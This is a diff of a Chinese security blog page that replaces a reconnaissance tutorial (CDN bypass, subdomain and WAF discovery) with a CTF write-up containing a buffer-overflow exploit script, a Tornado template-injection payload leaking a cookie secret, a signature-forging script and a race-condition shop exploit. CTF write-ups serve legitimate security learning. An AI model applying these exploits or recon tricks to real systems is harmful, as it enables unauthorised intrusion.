@@ -22,7 +22,7 @@
     <meta name="description" content="">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>渗透测试初步学习之信息收集 · SuperY4Ng&#39;s Blog</title>
+    <title>护网杯WP · SuperY4Ng&#39;s Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/" >SuperY4Ng&#39;s Blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">渗透测试初步学习之信息收集</a>
+                <a href="#" class="post-name">护网杯WP</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            渗透测试初步学习之信息收集
+            护网杯WP
             <!-- 404 -->
             
         </h1>
@@ -266,18 +266,18 @@ height:50vh;
                 
                     <div class= post-intro-tags >
     
-        <a class="post-tag" href="javascript:void(0);" data-tags = "渗透测试">渗透测试</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags = "CTF">CTF</a>
     
 </div>
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">1.3k</span>阅读时长: <span class="post-count reading-time">4 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">1.3k</span>阅读时长: <span class="post-count reading-time">5 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2018/09/16</span>
+                    <span class="post-intro-time">2018/10/14</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -401,91 +401,105 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">该文章首发于CSDN:https://blog.csdn.net/Super_Yiang/article/details/82490624</span><br></pre></td></tr></table></figure>
-<p>​    信息收集的主要目的是为了制定下一步的攻击方案。</p>
-<p>​    那信息收集要收集哪些信息？</p>
-<ol>
-<li><p>是否存在CDN</p>
-<p>（1）简介</p>
-<p>​    CDN的全称是Content Delivery Network，即内容分发网络。其基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。通过在网络各处放置节点服务器所构成的在现有的互联网基础之上的一层智能虚拟网络，CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。其目的是使用户可就近取得所需内容，解决 Internet网络拥挤的状况，提高用户访问网站的响应速度。 </p>
-<p>（2）验证是否存在CDN</p>
-<ul>
-<li><p>方法1</p>
-<p>​    很简单，使用各种多地 ping 的服务，查看对应 IP 地址是否唯一，如果不唯一多半是使用了CDN， 多地 Ping 网站有： </p>
-</li>
-</ul>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http://ping.chinaz.com/</span></span><br><span class="line"><span class="attribute">http://ping.aizhan.com/</span></span><br><span class="line"><span class="attribute">http://ce.cloud.360.cn/</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li><p>方法2</p>
-<p>在线工具查看是否存在CDN，可以参考以下站点: </p>
-</li>
-</ul>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http://www.cdnplanet.com/tools/cdnfinder/</span></span><br><span class="line">http://www.ipip.net/ip.html   #IP、Ping、CDN、DNS等查询</span><br></pre></td></tr></table></figure>
-<p>（3）绕过CDN查找网站真实IP、</p>
-<ul>
-<li><p>查询历史DNS记录</p>
-<p>​    查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录，相关查询网站有：</p>
-</li>
-</ul>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://x.threatbook.cn/  #存在很多情报</span><br><span class="line">https://viewdns.info/   #DNS、Ping、Whois,反向IP等</span><br></pre></td></tr></table></figure>
-<ul>
-<li><p>查询子域名</p>
-<p>​    有可能有些站长只给主站或流量大的子域名做了CDN,而很多子域名都是和主站在同一台服务器上，或者 C段中，这样可以通过子域名来辅助找到网站真实IP 。</p>
-</li>
-<li><p>利用网站漏洞</p>
-<p>​    fopen 、 file_get_contents 这些函数，将文件参数改成自己服务器的IP，让对方服务器主动连接我们，然后从日志找到对方真实IP 。</p>
-</li>
-<li><p>目标敏感文件泄露</p>
-<p>​    比如PHPinfo这类的探针 。</p>
-</li>
-</ul>
-</li>
-<li><p>服务器信息</p>
-<ul>
-<li>IP地址，结合上面的CDN绕过，获取到IP </li>
-<li>服务器的系统类型 (windows、linux(Ubuntu、ContentOS)) </li>
-<li>支持的脚本类型 (asp、aspx、php、jsp) </li>
-<li>Web容器 (apache 、IIS 、nginx) </li>
-<li>开放端口情况 (21,22,80,1433,5900,3306,3389,8080,43958) </li>
-<li>绝对路径 (报错页面显示、探针显示) </li>
-</ul>
-</li>
-<li><p>子域名收集</p>
-<p>​    这里主要提到一款子域名收集的工具 和 一个资产收集的平台 。</p>
-<h5 id="Layer子域名挖掘机"><a href="#Layer子域名挖掘机" class="headerlink" title="Layer子域名挖掘机"></a><strong>Layer子域名挖掘机</strong></h5><p>​    Layer 是Seay法师写的一款，以暴力枚举为主的子域名收集工具。<a href="https://www.waitalone.cn/layer-subdomain-excavator.html" target="_blank" rel="noopener">Layer子域名挖掘机V2.1</a> </p>
-<p>PS：Layer 在目标站点被百度收录较少的时候使用效果不错，但是有一个不太好的地方就是，Layer把生成的子域名字符串会加载到内存中，导致程序占用大量内存而变得很卡。(很多老工具都有这个问题，比如御剑前辈的后台扫描)</p>
-<h5 id="云悉资产收集"><a href="#云悉资产收集" class="headerlink" title="云悉资产收集"></a><strong>云悉资产收集</strong></h5><p>​    云悉是一个很棒的在线分布式资产收集平台，具体可以到 <a href="http://www.yunsee.cn/" target="_blank" rel="noopener">http://www.yunsee.cn</a> 了解一下。 </p>
-</li>
-<li><p>Whois查询</p>
-<p>​    用站长工具whois查询域名的所有者情况和注册邮箱，可以根据注册者的信息生成爆破字典。 </p>
-</li>
-<li><p>指纹验证</p>
-<p>​    指纹验证是识别目标站点采用了什么CMS搭建，然后根据CMS制定攻击方案。</p>
-<p>PS：CMS是”Content Management System”的缩写，意为”内容管理系统”。一个内容管理系统通常有如下要素：文档模板、脚本语言或标记语言、与数据库集成。</p>
-<p>指纹验证工具有两个：</p>
-<ul>
-<li>御剑</li>
-<li>云溪</li>
-</ul>
-</li>
-<li><p>WAF探测</p>
-<p>     进行WAF探测的目的是为了防止在有WAF的情况下还进行大规模的扫描导致被封IP。</p>
-<p>PS：Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF） </p>
-<h5 id="wafw00f"><a href="#wafw00f" class="headerlink" title="wafw00f"></a><strong>wafw00f</strong></h5><p>​    WAF探测常用的工具是 kali下的 WafW00f , 对国外的waf探测效果比较好，对国内的waf不太敏感。具体还是要自己手工进行探测。 </p>
-<h5 id="手工探测WAF"><a href="#手工探测WAF" class="headerlink" title="手工探测WAF"></a><strong>手工探测WAF</strong></h5><ul>
-<li>护卫神 ，在有护卫神的站点上会发现HTML中会有\<hws>\&lt;\hws&gt;这样的标签 </hws></li>
-<li>安全狗 ，随便输入一个目标站点不存在的页面，它便会跳转到安全狗的404界面 </li>
-<li>云Waf , 比如腾讯云、阿里云，如果发现目标主机IP是这两个云产品的，一般情况下，该目标会受到腾讯云、阿里云的保护。此外云waf还有百度的加速乐等.. </li>
-</ul>
-</li>
-<li><p>绝对路径</p>
-<p>​    绝对路径探测也是信息收集的一部分，在后面的渗透中很多地方需要用到据对路径来进行下一步渗透。</p>
-<p>  绝对路径的探测方法：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.site:域名 warning # google or baidu</span><br><span class="line">2.报错显示,比如注入点报错就可以显示出来</span><br><span class="line">3.phpinfo中泄露</span><br></pre></td></tr></table></figure>
-<p>​    </p>
-<p>​    </p>
-</li>
-</ol>
+        <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">PS:https://blog.csdn.net/Super_Yiang/article/details/83043874</span></span><br></pre></td></tr></table></figure>
+<p>护网杯大赛告终，很难，但是学到了很多，码上自己所学的和大佬的WP，并奉上大佬的<a href="https://qingchenldl.github.io/" target="_blank" rel="noopener">博客地址</a></p>
+<h4 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h4><p>题目是“easy xor”，这个题应该和异或运算相关。</p>
+<p>下载文件之后发现这个字符串很像base64加密之后的</p>
+<p><img src="https://i.loli.net/2018/10/13/5bc2023aac738.png" alt=""></p>
+<p>Base64解码试一下：</p>
+<p><img src="https://i.loli.net/2018/10/13/5bc202799c924.png" alt=""></p>
+<p>考虑到可能还有异或操作，虽然有乱码暂时可以接受。然后就是写异或的脚本了，不太清楚和谁异或，写个循环..吧，放脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">a = <span class="string">"AAoHAR1XICciX1IlXiBUVFFUIyRRJFRQVyUnVVMnUFcgIiNXXhs="</span></span><br><span class="line">b=base64.b64decode(a.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">c = b.decode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">200</span>):</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> c:</span><br><span class="line">        f=ord(a)^i</span><br><span class="line">        print(chr(f),end=<span class="string">""</span>)</span><br><span class="line">    print()</span><br></pre></td></tr></table></figure>
+<p>运行一下，就出flag了</p>
+<p><img src="https://i.loli.net/2018/10/13/5bc202fe9439e.png" alt=""></p>
+<h4 id="Fez-密码题"><a href="#Fez-密码题" class="headerlink" title="Fez(密码题)"></a>Fez(密码题)</h4><p>看题目…没有题目，下载附件发现里边有两个文件</p>
+<p><img src="https://i.loli.net/2018/10/13/5bc2033698cff.png" alt=""></p>
+<p>fez.log</p>
+<p><img src="https://i.loli.net/2018/10/13/5bc203533d79a.png" alt=""></p>
+<p>看过py文件之后很容易知道这是test fez(test,K) fez(m,K)的输出结果</p>
+<p>从后往前看加密算法：</p>
+<p>K是一个包含7组27位随机数的嵌套列表</p>
+<p>M是flag加上几位随机数</p>
+<p>Fez()函数调用了7次round()函数，round()函数是将输入的明文分成两部分，右半部分作为新序列的左半部分，新序列的右半部分通过异或产生。如此循环之后相当于明文的右半部分经过3次异或，而左半部分经过4次异或。</p>
+<p>至此加密算法分析完成。</p>
+<p>由于明文左右两部分均经过加密，因此考虑将K密钥组想象成一个密钥k</p>
+<p>……….开始尝试……..</p>
+<p>假设输入p，执行fez(p,K)</p>
+<p>R1=p_l</p>
+<p>L1=xor(xor(p_l,p_r),K1)</p>
+<p>第一轮加密之后，可看成对R1L1进行3轮加密</p>
+<p>开始解码了….</p>
+<p>已知test和fez(test,K)</p>
+<p>所以，</p>
+<p>tk_l=xor(test_r,k1) </p>
+<p>tk_r=xor(xor(test_l,test_r),k2)</p>
+<p>得到，</p>
+<p>k1=xor(tk_l,test_r)</p>
+<p>k2=xor(xor(test_l,test_r),tk_r)</p>
+<p>由mk=fez(m,K)</p>
+<p>得到，</p>
+<p>mk_l=xor(m_l,k1)</p>
+<p>mk_r=xor(xor(m_l,m_r),k2)</p>
+<p>因此，</p>
+<p>m_l=xor(k1,mk_l)</p>
+<p>m_r=xor(xor(m_l,mk_r),k2)</p>
+<p>分析完成，写脚本吧</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Lout=R^k1^k2^k4^k5</span></span><br><span class="line"><span class="comment">#Rout=L^R^k0^k1^k2^k3^k5</span></span><br><span class="line"></span><br><span class="line">test = <span class="string">'c8b84d08e5a8e60a49578f387fff5a90e9e7c181734bf05be4f5403c9ea24a0b8741a329991637e11fa69019cd3b01d7c95b65f5abd5'</span></span><br><span class="line">test_out = <span class="string">'5c3660c27cb9b3785a5ce06022e88bc831017e882d39475ea85d919ad9e5ac498f86c553216cab1f8f7468353d46ba8971efa9ca8c81'</span></span><br><span class="line">flag_out = <span class="string">'519ab6fc0e435da00516b844f8fe664bfe9445992f478dc650701739a11ffda5bbeb643159d7e8cd03a2104c798a1ca734b905ee6c76'</span></span><br><span class="line"></span><br><span class="line">L = test.decode(<span class="string">'hex'</span>)[<span class="number">0</span>:<span class="number">27</span>]</span><br><span class="line">R = test.decode(<span class="string">'hex'</span>)[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line"></span><br><span class="line">L2 = test_out.decode(<span class="string">'hex'</span>)[<span class="number">0</span>:<span class="number">27</span>]</span><br><span class="line">R2 = test_out.decode(<span class="string">'hex'</span>)[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> len(a)==len(b)</span><br><span class="line">    c=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">        c+=chr(ord(a[i])^ord(b[i]))</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">k1 = xor(L2,R)</span><br><span class="line">k2 = xor(xor(L,R), R2)</span><br><span class="line"></span><br><span class="line">L3 = flag_out.decode(<span class="string">'hex'</span>)[<span class="number">0</span>:<span class="number">27</span>]</span><br><span class="line">R3 = flag_out.decode(<span class="string">'hex'</span>)[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line"></span><br><span class="line">R4 = xor(L3,k1)</span><br><span class="line">L4 = xor(xor(k2,R3), R4)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'flag:'</span>, L4+R4</span><br></pre></td></tr></table></figure>
+<p>Flag：</p>
+<p><img src="https://i.loli.net/2018/10/13/5bc203a26d95c.png" alt=""></p>
+<h4 id="gettingstart-（pwn）"><a href="#gettingstart-（pwn）" class="headerlink" title="gettingstart （pwn）"></a>gettingstart （pwn）</h4><p>先用IDA打开程序:</p>
+<p><img src="https://i.loli.net/2018/10/13/5bc2059472635.png" alt=""></p>
+<p>很明显可以通过溢出buf从而修改v7和v8的值满足判断和验证，所以构造脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process("./task_gettingStart_ktQeERc")</span></span><br><span class="line">p=remote(<span class="string">"49.4.94.186"</span>,<span class="number">31936</span>)</span><br><span class="line">payload=<span class="string">""</span></span><br><span class="line">payload+=<span class="string">"A"</span>*<span class="number">24</span>+p64(<span class="number">0x7FFFFFFFFFFFFFFF</span>)+p64(<span class="number">0x3FB999999999999A</span>)</span><br><span class="line">cmd=<span class="string">"cat flag"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.send(cmd)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br></pre></td></tr></table></figure>
+<p>就可以get到flag了。</p>
+<h4 id="easy-tornado-（WEB）"><a href="#easy-tornado-（WEB）" class="headerlink" title="easy tornado （WEB）"></a>easy tornado （WEB）</h4><p>打开链接：</p>
+<p><img src="https://i.loli.net/2018/10/13/5bc207ed9e237.png" alt=""></p>
+<p>分别打开，列出URL和内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">http://117.78.26.79:31093/file?filename=Orz.txt&amp;signature=d18abfad58ea53975f7cefbc16852b0c</span><br><span class="line">Orz.txt </span><br><span class="line">render()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://117.78.26.79:31093/file?filename=hint.txt&amp;signature=6724dcffafb1cbebd3034a845b3fcab3</span><br><span class="line">hint.txt </span><br><span class="line">md5(cookie_secret + md5(filename))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://117.78.26.79:31093/file?filename=flag.txt&amp;signature=a93589fc419617a5a0b91ab5443c5eaa</span><br><span class="line">flag.txt </span><br><span class="line">/fllllllllllag</span><br></pre></td></tr></table></figure>
+<p>发现就是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://117.78.26.79:31093/file?filename=[文件名]&amp;signature=[签名]</span><br><span class="line"></span><br><span class="line">签名是md5(cookie_secret + md5(filename))</span><br></pre></td></tr></table></figure>
+<p>问题就是找到<code>cookie_secret</code>，再看看<code>Orz.txt</code>里有说<code>render()</code>，看过大佬WP说这是生成模板的函数，所以注入STTI。</p>
+<p>输入读取文件</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://117.78.26.79:31093/file?filename=t.txt&amp;signature=6724dcffafb1cbebd3034a845b3fcab3</span><br></pre></td></tr></table></figure>
+<p>发现读取文件失败，但是从失败的链接中发现STTI漏洞</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://117.78.26.79:31093/error?msg=xxxx</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2018/10/13/5bc20bc0296db.png" alt=""></p>
+<p>然后就是测试是否存在过滤，发现过滤的字符有：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;%&apos;()*-/=[\]_|</span><br></pre></td></tr></table></figure>
+<p>这时候大佬的WP又起作用了</p>
+<p><img src="https://i.loli.net/2018/10/13/5bc20c5bda469.png" alt=""></p>
+<p>并附上<a href="https://tornado.readthedocs.io/en/latest/guide/templates.html#template-syntax" target="_blank" rel="noopener">Tornado官方文档</a></p>
+<p>构造payload为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://117.78.26.79:31093/error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2018/10/13/5bc20d03ea0fb.png" alt=""></p>
+<p>得到<code>cookie_secret</code>，利用这个<code>cookie_secret</code>，可以写脚本，来获得相应文件的签名值。 </p>
+<p>附上大佬的脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">cookie_secret=<span class="string">r'vjEg&gt;W_%Vr.Jd&lt;H(n)@wz&amp;20ut8&#123;i9O$&#125;MBDbCf!YFQ~xh3eA?4cK1X[oIZ*6+5U'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(code)</span>:</span></span><br><span class="line">	temp = hashlib.md5(str(code)).hexdigest()</span><br><span class="line">	<span class="keyword">return</span> temp</span><br><span class="line">filename = <span class="string">'/fllllllllllag'</span></span><br><span class="line">res = md5(cookie_secret + md5(filename))</span><br><span class="line"><span class="keyword">print</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment"># 44f26315d2ed77e83fa715d9d6b48f96</span></span><br></pre></td></tr></table></figure>
+<p>跑完脚本，放进URL就出flag了</p>
+<p><img src="https://i.loli.net/2018/10/13/5bc20e51a9dc7.png" alt=""></p>
+<h4 id="ltshop（WEB）"><a href="#ltshop（WEB）" class="headerlink" title="ltshop（WEB）"></a>ltshop（WEB）</h4><p>注册账号，进入系统，发现我们有￥20 </p>
+<p><img src="https://i.loli.net/2018/10/13/5bc20f411f030.png" alt=""></p>
+<p>看一下要求 </p>
+<p><img src="https://i.loli.net/2018/10/13/5bc20f68ef722.png" alt=""></p>
+<p>思路很清晰</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">开局¥20</span><br><span class="line">一包大辣条¥5</span><br><span class="line">5包大辣条换一包辣条之王</span><br><span class="line">9999999包辣条之王才能换flag</span><br></pre></td></tr></table></figure>
+<p>很明显按照正常思路是不可能买到辣条之王的，更别说要用那么多的辣条之王换flag，所以猜测会用到溢出，但是要溢出至少也需要一包辣条之王才行。</p>
+<p>这时候万能的大佬WP成功上线，条件竞争，大佬经过试验发现一个账户同时登陆两个页面同时买辣条，只会扣一次钱，却会得到两根辣条。大佬用burpsuite进行条件竞争，设置多个线程：</p>
+<p><img src="https://i.loli.net/2018/10/14/5bc218a5ed999.png" alt=""></p>
+<p>然后发现成功的买到了15包大辣条</p>
+<p><img src="https://i.loli.net/2018/10/14/5bc218d2b6402.png" alt=""></p>
+<p>接下来考虑溢出（大佬的WP写着）：</p>
+<p>int： <code>2**32-1 = 4294967295</code></p>
+<p>long： <code>2**63 -1 = 9223372036854775807</code></p>
+<p>longlong： <code>2**64-1 = 18446744073709551615</code></p>
+<p>但是要<strong>注意一点，这个题的逻辑是，numer*5&lt;最大值</strong></p>
+<p>所以，其临界值应该为<code>18446744073709551615 / 5 == 3689348814741910323</code></p>
+<p>于是尝试<code>3689348814741910323+1 == 3689348814741910324</code></p>
+<p>溢出后的值比较小，在辣条的数量之内，从而兑换成功。</p>
+<p><img src="https://i.loli.net/2018/10/14/5bc2194c8d2fc.png" alt=""></p>
+<p><img src="https://i.loli.net/2018/10/14/5bc21978432b6.png" alt=""></p>
+<p>成功的购买到了很多辣条之王，可以兑换苦苦追寻的flag了。</p>
+<p><img src="https://i.loli.net/2018/10/14/5bc21a02d1de5.png" alt=""></p>
 
     </article>
     <!-- license  -->
@@ -494,17 +508,12 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href= "/2018/09/16/渗透测试初步学习之漏洞发现/" title= "渗透测试初步学习之漏洞发现和源码泄露">
-                    <div class="nextTitle">渗透测试初步学习之漏洞发现和源码泄露</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2018/09/16/I春秋CTF训练营web题解（一）/" title= "I春秋CTF训练营web题解（一）">
-                    <div class="prevTitle">I春秋CTF训练营web题解（一）</div>
+                <a href= "/2018/10/10/流密码/" title= "流密码">
+                    <div class="prevTitle">流密码</div>
                 </a>
             
         </li>
@@ -634,7 +643,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#Layer子域名挖掘机"><span class="toc-number">1.</span> <span class="toc-text">Layer子域名挖掘机</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#云悉资产收集"><span class="toc-number">2.</span> <span class="toc-text">云悉资产收集</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#wafw00f"><span class="toc-number">3.</span> <span class="toc-text">wafw00f</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#手工探测WAF"><span class="toc-number">4.</span> <span class="toc-text">手工探测WAF</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#签到题"><span class="toc-number">1.</span> <span class="toc-text">签到题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Fez-密码题"><span class="toc-number">2.</span> <span class="toc-text">Fez(密码题)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#gettingstart-（pwn）"><span class="toc-number">3.</span> <span class="toc-text">gettingstart （pwn）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#easy-tornado-（WEB）"><span class="toc-number">4.</span> <span class="toc-text">easy tornado （WEB）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ltshop（WEB）"><span class="toc-number">5.</span> <span class="toc-text">ltshop（WEB）</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
